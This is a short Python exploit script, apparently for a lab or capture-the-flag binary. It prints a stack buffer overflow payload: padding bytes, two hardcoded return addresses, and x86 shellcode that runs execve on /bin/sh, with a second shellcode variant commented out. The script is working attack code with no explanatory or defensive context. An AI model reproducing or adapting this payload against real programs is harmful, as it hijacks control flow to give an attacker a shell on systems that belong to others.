import sys
from struct import pack

ret_addr2 = 0xffffde60
ret_addr1 = 0x7fff

ret_addr2 = pack("<I", ret_addr2 + 48)
ret_addr1 = pack("<I", ret_addr1)

# Shellcode & return address
shellcode = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80\x00"
#shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x00"
    
sys.stdout.buffer.write(b"A"*34 + b"B"*6 + ret_addr2 + ret_addr1 + shellcode)
 
